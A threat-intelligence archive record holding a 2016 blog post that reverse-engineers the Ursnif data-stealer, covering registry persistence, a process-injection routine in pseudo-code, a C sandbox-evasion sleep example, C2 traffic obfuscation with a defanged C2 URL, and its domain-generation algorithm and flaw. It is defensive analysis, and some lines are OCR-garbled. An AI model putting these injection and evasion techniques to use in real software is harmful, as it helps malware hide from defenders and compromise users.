{
    "id": "4fd16cc4-dbdf-482a-86f6-4886852499ca",
    "created_at": "2023-01-12T15:10:47.570571Z",
    "updated_at": "2025-03-27T02:05:49.133454Z",
    "deleted_at": null,
    "sha1_hash": "8d171dd85e4b4a0c240b4d39722b05e2e4b4a43e",
    "title": "2016-11-01 - Ursnif Malware- Deep Technical Dive",
    "authors": "",
    "file_creation_date": "2022-05-28T04:03:47Z",
    "file_modification_date": "2022-05-28T04:03:47Z",
    "file_size": 758021,
    "plain_text": "# Ursnif Malware: Deep Technical Dive\n\n**arielkoren.com/blog/2016/11/01/ursnif-malware-deep-technical-dive/**\n\nAK November 1, 2016\n\nIn this blog I explain some of the core methods an attack tool named Ursnif uses, as well as mention some, probably unintentional, pieces of\ncode that were left behind in the production version of the malware.\n\nUrsnif is a data stealer and a downloader with a lot of abilities to steal data from installed browsers and other applications (such as Microsoft\nOutlook).\n\nIn addition to stealing data, Ursnif also has the ability to download additional malicious components from the attacker’s Command & Control\n(C&C) servers and load them dynamically into memory. In this version of Ursnif I have also encountered an internal peer-to-peer\ncommunication which could possibly add the ability for the sample to communicate with other Ursnif peers over the same network. We will\ndiscuss the peer-to-peer part in a future blog post.\n\n## It All Begins With An Executable\n\n\n-----\n\ne t e U s e ecutab e s st oaded, t u pac t e ea pay oad e ea pay oad s pac ed by t e attac e s, because t e ps\nkeeping it undetected by security solutions which are based on a file signature.\n\n[After the real payload is unpacked, it will run in a hollowed process, and even at that stage of unpacking, the .BSS section is still obfuscated](https://en.wikipedia.org/wiki/Data_segment)\nand will be de-xored on runtime before the malware will continue with the execution.\n\nThe bss section before\n\nand after dexoring it\nAfterward, there is a simple check the malware authors left behind. If the file C:\\321.txt exists, the checks for a virtualized environment are\nignored. This was most probably developed in order to allow the attackers to test their tool on their own virtualized machines. Even though it is\nquite funny that the attackers left this piece of code in a production compilation, it might show how careless they are. Basically, if anyone else\nwould like to test Ursnif on a virtual machine, they can just create a file with that name at that location and the malware will work properly with\nno need to change the virtual machine’s configurations.\nNext, the malware will make sure that all of the users on the machine are infected, by enumerating the registry root key HKU and for each user\nkey, it will put an appropriate startup value, as well as the payload on each AppData folder of each user. Registry Keys used:\n\nHKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\AppData\n\n(Value equals the folder to be used for the malware, for example:\nC:\\Users\\Administrator\\Appdata\\Roaming\\”)\n\nAfter this procedure, we move on to the injection method.\n\n## And It Continues With Another Executable To Be Injected\n\nIn the second part, the malware will look for a legitimate process to run in its context. Running in a different process context allows the\nmalware to bypass firewall rules which let some processes through without alerting or blocking them.\n\nInternally, the malware calculates a unique checksum for each process name it finds, in order to obfuscate the processes into which it will try to\ninject itself. Instead of injecting to explorer.exe for example, a checksum will be calculated, resulting in something like 0x17F9B5AA. Then, it\nwill check if that value matches a value from an internal list of checksums, and only if it exists in that list, it will begin the injection method on\nthat process.\n\nLet’s examine a pseudo code (as simple as possible) of how the first part of the injection looks:\n```\n/* Obtain the process pid to inject to */\ndwPID = GetInjectProcess()\nhProcess = OpenProcess(dwPID, ...)\npAddress = GetProcAddress(\"ntdll.dll\", \"RtlExitUserThread\")\n/* Create remote thread in suspended mode */\nhThread = CreateRemoteThread(hProcess,  /* Remote process handle */\n              CREATE_SUSPENDED, /* creation flags */\n              pAddress, /* thread function address */\n              ...)\n/* Read remote procedure first four bytes */\ndwBackupData = ZwReadVirtualMemory(hProcess, /* Remote process handle */\n                                      pAddress, /* Address to read */\n                4, /* number of bytes to read */\n                ...)\n/* Change address protection to `writable` */\nVirtualProtectEx(hProcess, /* Remote process handle */\n                   READ_WRITE_EXECUTE, /* New protection flags */\n                   pAddress, /* Address to change protection on */\n                   4, /* Size of address */\n                   ...)\nZwWriteVirtualMemory(hProcess, /* Remote process handle */\n                        pAddress, /* Address to overwrite */\n                        0xCCCCFEEB, /* Data to write */\n                        4, /* Size of data */\n                        ...)\n\n```\n\n-----\n\nOpe a a d e to t e des ed p ocess\nGet the address of `ntdll!RtlExitUserThread function.`\nCreate a remote suspended thread with the appropriate function.\nObtain the first four bytes of the function as a backup (because in the upcoming steps, they will be overwritten).\nBefore we overwrite the bytes, we must change the protection flags of the memory so it will be writable.\nWrite four bytes `(DWORD)(0xCCCCFEEB) . This is the interesting part, changing the original function prologue this way, will result in an`\ninfinite loop.\n\nLet’s examine the function before and after the changes:\n\n**Before** **After**\n\n```\n ntdll!RtlExitUserThread:\n77dc1000 8bff mov edi,edi\n77dc1002 55 push ebp\n77dc1003 8bec mov ebp,esp\n77dc1005 83e4f8 and esp,0FFFFFFF8h\n77dc1008 81ecbc000000 sub esp,0BCh\n\n```\n```\nntdll!RtlExitUserThread:\n77dc1000 ebfe jmp ntdll!RtlExitUserThread (77dc1000)\n77dc1002 cc int 3\n77dc1003 cc int 3\n77dc1004 ec in al,dx\n77dc1005 83e4f8 and esp,0FFFFFFF8h\n77dc1008 81ecbc000000 sub esp,0BCh\n\n```\n\nAfter the change, the new values assigned to the function prologue are translated to `JMP <Short>, which is a two byte opcode. The first byte`\n( 0xEB ) is what translated the processor to recognize it as a `JMP opcode, and it will also expect the second byte to be the value of where to`\njump to (Relatively from the EIP at the end of the opcode). The second byte we have in this scenario is `0xFE, which translates to (-2).`\nJumping relatively from the end of the opcode ( address 0x77dc1002 ) -2 bytes, will make the EIP get back to address `0x77dc1000, which`\nis the same opcode again. This will result an infinite loop of one opcode. as you can see WinDBG translates it beautifully:\n```\n77dc1000 ebfe      jmp   ntdll!RtlExitUserThread (77dc1000)\n\n```\n\nAfter this change, the thread is resumed until its EIP of the newly created thread reach the `ntdll!RtlExitUserThread address, then the`\nthread is set to suspended mode again. The reason all this procedure is happening is because when a thread is created, it doesn’t immediately\nstart at the function given, it requires some initialization functions to be called first, so the original code is waiting for the initialization to\ncomplete and then it have a post initialized thread which it can take control of its EIP without worrying.\n\nThereafter the thread is suspended again, the function original 4 bytes are restored. The new PE itself is injected with `NtCreateSection and`\n```\nNtMapViewOfSection, for mapping the new PE to the malware’s memory ending with SetThreadContext which with that we are able to\n\n```\nchange the registers value, specifically EIP – to the new created entry point of the remote process following `ResumeThread .`\n\nAs we’ve seen before, attackers are building techniques into their tools in order to evade detection by security solutions. One of the techniques\nexploits sandbox weaknesses by using different sleeping mechanisms. Sandboxing solutions usually run malware samples only for about 2-3\nminutes before they move on to the next sample they have in queue. The reason is simply because those kind of solutions are required to\nkeep up with analyzing hundreds of thousands of samples every day. Therefore, for a sandbox time is a very precious resource. Basically, this\nmeans that if a malware can stay dormant for this period of time, the sandbox will not recognize its behavior as malicious and will move to the\nnext sample in queue.\n\nUrsnif has recently evolved and changed the sleeping mechanism, trying to evade detection through a unique sleeping API. Earlier versions\nused `Sleep \\ WaitForSingleObject \\ WaitForMultipleObjects or similar APIs. Nowadays, a different method coming in hand, Relative`\nsleeping using windows timers. Here is a code example of how to use the Timers API:\n\n\n-----\n\n```\n#include <tchar.h>\n/* Definitions */\n#define SLEEP_TIME (5) /* In seconds */\n/* Macros */\n#define NANOSECONDS(nanos) \\\n(((signed __int64)(nanos)) / 100L)\n#define MICROSECONDS(micros) \\\n(((signed __int64)(micros)) * NANOSECONDS(1000L))\n#define MILLISECONDS(milli) \\\n(((signed __int64)(milli)) * MICROSECONDS(1000L))\n#define SECONDS(seconds) \\\n(((signed __int64)(seconds)) * MILLISECONDS(1000L)) \n/* Enumerations */\ntypedef enum _E_CODE\n{\n    E_FAILURE = -1,\n    E_SUCCESS = 0,\n    E_TIMER_CREATION,\n    E_SET_TIMER,\n    E_WAIT_EVENT,\n} E_CODE;\nE_CODE SleepingMechanism(DWORD dwSleepTime)\n{\n    /* Initializations */\n    HANDLE hTimer = NULL;\n    E_CODE tRetVal = E_FAILURE;\n    FILETIME ftSystemTime = { 0 };\n    LARGE_INTEGER liSystemTime = { 0 };\n    DWORD dwWaitResult = 0;\n    /* Create unnamed timer */\n    hTimer = CreateWaitableTimer(NULL, FALSE, NULL);\n    if (NULL == hTimer)\n    {\n        _tprintf(TEXT(\"CreateWaitableTimer failure: [%d]\\n\"), GetLastError());\n        tRetVal = E_TIMER_CREATION;\n        goto lblCleanUp;\n    }\n    /* Get system time */\n    GetSystemTimeAsFileTime(&ftSystemTime);\n    /* Add relative time from current time to sleep */\n    liSystemTime.HighPart = ftSystemTime.dwHighDateTime;\n    liSystemTime.LowPart = ftSystemTime.dwLowDateTime;\n    liSystemTime.QuadPart += SECONDS(dwSleepTime);\n    /* Set timer with an absolute time to sleep */\n    if (!SetWaitableTimer(hTimer, &liSystemTime, 0, NULL, NULL, FALSE))\n    {\n        _tprintf(TEXT(\"Failed creating waitable timer: [%d]\"), GetLastError());\n        tRetVal = E_SET_TIMER;\n        goto lblCleanUp;\n    }\n    /* Waiting for the timer event*/\n    _tprintf(TEXT(\"Sleeping for [%d] seconds\\n\"), dwSleepTime);\n    dwWaitResult = WaitForSingleObject(hTimer, INFINITE);\n    if (WAIT_OBJECT_0 != dwWaitResult)\n    {\n        _tprintf(TEXT(\"WaitForSingleObject failed: [%d]\"), dwWaitResult);\n        tRetVal = E_WAIT_EVENT;\n    }\n    /* Success */\n    tRetVal = E_SUCCSES;\nlblCleanUp:\n    if (NULL != hTimer)\n    {\n        CloseHandle(hTimer);\n        hTimer = NULL;\n    }\nreturn tRetVal;\n}\nINT _tmain(DWORD dwArgc, LPTSTR *lpszArgv)\n{\n    E_CODE tRetVal = E_FAILURE;\n    tRetVal = SleepingMechanism(SLEEP_TIME);\n    if (E_SUCCSES != tRetVal)\n        _tprintf(TEXT(\"Failure: [%d]\"), (DWORD)tRetVal);\n    else\n        _tprintf(TEXT(\"Success\\n\"));\n    return 0;\n}\n\n```\n\n-----\n\n## The Additional Evasive Techniques and the DGA Flaw\n\nOnce the attacker tool is able to evade the sandbox, it will try to evade network security solutions which are based on communication pattern\nsignatures. Let’s examine two such evasive techniques:\n\nObfuscating the outbound traffic\n\nThe first data sent from the infected machine would start with the following string format:\n```\nsoft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\n\n```\nAfter adding the values which represent the machine (will not be discussed in this blog post) to the format string, the malware will xor the\noriginal value and move on to base64 encoding. Thereafter removing the “=” padding.\n```\nW+WIpnoUOvyD3ExoGOYmmDu0bmT8a0IQc2p7qTZymZCHt8eu27PEunoWst7LOJNxEVYBinB9iwNBQ6dP+msKM1eHuJg8mb5vu2siAOn72yyGQxwIDyVrNC1\n\n```\nThen adding “/” at random offsets of the string, following with changing every unique letter (which doesn’t match [a-zA-Z0-9]) to its\nhexadecimal format starting with “_”. For example the letter “+” hex representation is 2B, and the letter “/” hex representation is 2F, so the\noutput will end up looking like:\n```\nWWIpnoUOvyD3ExoGOYmmDu0bmT8a0IQc2p7qTZymZCHt8eu27PEunoWst7LOJNxEVYBinB9iwN_2FBQ6dP_2BmsKM1eHuJg_2F8mb5vu2siAOn72yyGQxwI\n\n```\nFinally, there is a second call to the function, adding the “/” slash character at random offsets and then the string is complete.\n```\nW_2BWIpn_2FoUOvyD3ExoGO/YmmDu0bmT8/a0IQc2p7qTZymZCHt/8eu27PEunoWs/t7LOJNxEVYB/inB9iwN_2FBQ6d/P_2BmsKM1eHuJg_2F8mb5/vu2s\n\n```\nThis is sent to the C&C server with the following format:\n“ <Domain>/images/<CraftedBase64Url>.gif ”\nwhere the `<Domain> will be chosen by the DGA algorithm, and the` `<CraftedBase64Url> is what was just created.`\n```\nhttp://thiscrevmscllevelfak[.]club/images/W_2BWIpn_2FoUOvyD3ExoGO/YmmDu0bmT8/a0IQc2p7qTZymZCHt/8eu27PEunoWs/t7LOJNxEVYB\n\n```\nDomain Generation Algorithm (DGA)\n\nWhen I first reverse engineered the DGA and tried to recreate it using Python, for some reason my code didn’t work as expected and I got\ndifferent results compared to the actual domains used by the attackers. When I reversed everything slowly and made sure my code does\nexactly what it is supposed to – I found out that they have some logical flaw in the code. Whether this was intentional or not, I will let you be the\njudge. But I am pretty sure it was unintentional. Let’s see what exactly is going on in there step by step:\n\n1.\n\n1. Download a predefined wordlist from an online text file.\n\nIn python that would be as easy as using `urllib2.urlopen .`\n2. Obtain all the words that are at least 3 letters long. In python that would be: re.findall(\"[a-zA-Z]{3,}\", data)\n3. Add a null termination ( 0x00 ) after every word that matched, in the original buffer.\n4. Override the original data with the matching words, after every word add space bar.\n\n(Author comments: This is necessarily shorter than the original buffer so it should work, however in general this is very bad code\npractice.)\n5. Create the domain using the strings in the buffer list of Step Three.\n\n\n-----\n\nThe ‘bug’ in action\n\n\nNow, the problem exists at Step Four, let’s take a look at the assembly:\n\nTo understand the problem better, let’s have a dummy buffer to demonstrate the issue.\n```\nMatch-Another se cu DEADBEEF le rt\n\n```\n\nApplying the regex from Step Two would result in the following word list:\n```\n[\"Match\", \"Another\", \"DEADBEEF\"]\n\n```\n\nAdding the null termination on the original string will make it look like:\n```\nMatch\\x00Another\\x00se cu DEADBEEF\\x00le rt\n\n```\n\nAfter that, we are going to copy each of those strings, override the original buffer with them, and add a space bar right after. This should result\nthe matching strings being one after another ordered in that buffer. However, the first copy is the reason for the problem. We are first of all\ncopying the original word over itself using ‘lstrcpy’, resulting in the same buffer.\n```\nMatch\\x00Another\\x00se cu DEADBEEF\\x00le rt\n\n```\n\nBut after that, we are using ‘lstrcat’ to add a space after the word. The MSDN documentation of `lstrcat` states:\n\n**“lpString1 must be large enough to add lpString2 and the closing ‘\\0’,”**\n\nwhich means that there are going to be two more bytes added! One of them is the space, and the other one is the null termination coming right\nafter, resulting in the following problem:\n```\nMatch \\x00nother\\x00se cu DEADBEEF\\x00le rt\n\n```\n\nAs you can see, it overwrote some of the next word, which will eventually make it “lose” one of the words in the list making the whole wordlist\nshort by one essentially affecting all of the DGA.\n\n(Author Comments: I believe the malware authors have no idea they have such a bug in their code because they are probably using the\nexact same piece of code to know which domains they should buy.)\n\n\n-----\n\nte success u y e e sed t e G a go t a d cou d ec eate t yse, e s o ed o e o t e ge e ated do a s o t e e t do a s\ncycle, and managed to find pretty interesting statistics about this family over a period of 5 days:\n\n**DGA Characteristics**\n\nType Dictionary based\n\nSeed Current date\n\nChange frequency 5 days period\n\nDomains Per Cycle 15\n\nTop level domains .ru, .xyz, .club\n\nTotal infected machines 6,893\n\nOn the analyzed sample, the DGA’s dictionary (word list) is generated from this url:\n[http://opensource.apple.com/source/Security/Security-29/SecureTransport/LICENSE.txt](http://opensource.apple.com/source/Security/Security-29/SecureTransport/LICENSE.txt)\n\nThe interesting part of this DGA is the fact it can change the file from which the wordlist is generated, thus making it very easy to create\ndifferent versions of the DGA for different purposes.\n\nAn example of actual domains generated from the dictionary:\n\nthiscrevmscllevelfak.club\nlevelignorethenind.ru\nmtabaddresslocked.xyz\nconsseriflistyleleft.club\naresymbolparamspan.ru\nrespondslemsonmsonum.club\nsenddatalistenpython.xyz\nnumfalseandyspan.ru\nmaxsemihiddenmsosymbol.club\ncllockedlevelnbsple.club\nnbspserliststthelist.xyz\nsymbolcontacttype.ru\nintoaddedprio.ru\nstylesendnblisprestval.xyz\nindentlspthatmcan.ru\n\nAnalyzed Samples:\n\n9b38f10fd425b37115c81ad07598d930\nb60c97d22f0ae301e916d61f79162b78\nf50bd1585f601d41244c7e525b8bd96a\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-11-01 - Ursnif Malware- Deep Technical Dive.pdf"
    ],
    "report_names": [
        "2016-11-01 - Ursnif Malware- Deep Technical Dive.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536247,
    "ts_updated_at": 1743041149,
    "ts_creation_date": 1653710627,
    "ts_modification_date": 1653710627,
    "files": {
        "pdf": "https://archive.orkl.eu/8d171dd85e4b4a0c240b4d39722b05e2e4b4a43e.pdf",
        "text": "https://archive.orkl.eu/8d171dd85e4b4a0c240b4d39722b05e2e4b4a43e.txt",
        "img": "https://archive.orkl.eu/8d171dd85e4b4a0c240b4d39722b05e2e4b4a43e.jpg"
    }
}